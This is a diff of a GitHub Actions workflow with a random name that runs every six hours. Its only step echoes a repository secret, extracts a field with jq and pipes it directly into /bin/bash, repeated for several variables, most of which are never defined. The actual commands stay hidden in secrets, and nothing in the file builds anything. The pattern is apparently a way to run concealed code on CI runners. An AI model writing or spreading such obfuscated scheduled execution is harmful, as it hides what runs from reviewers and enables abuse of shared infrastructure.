@@ -1,25 +1,21 @@
 name: rhinocerosesfoolhardy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
-jobs:  # 20806
+    - cron: '35 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: rhinocerosesfoolhardy
         env:
-          ri98298: ${{ secrets.ri98298 }}
+          s9868: ${{ secrets.s9868 }}
         run: |
-          echo $ri98298 | jq -r .ak5 | /bin/bash
-          echo $hbm63 | jq -r .c72803 | /bin/bash
-          echo $vrwr46 | jq -r .e3744 | /bin/bash
-          echo $yazj9 | jq -r .es73 | /bin/bash
-          echo $wxn18 | jq -r .x563 | /bin/bash
-          echo $nt056 | jq -r .ol0 | /bin/bash
-          echo $h92572 | jq -r .frz05 | /bin/bash
-          echo $m25082 | jq -r .cdtk16 | /bin/bash
+          echo $s9868 | jq -r .egc89021 | /bin/bash
+          echo $o0170 | jq -r .d9254 | /bin/bash
+          echo $wx51 | jq -r .u9 | /bin/bash
+          echo $w050 | jq -r .oy04 | /bin/bash
+          echo $cki6726 | jq -r .izu824 | /bin/bash
 
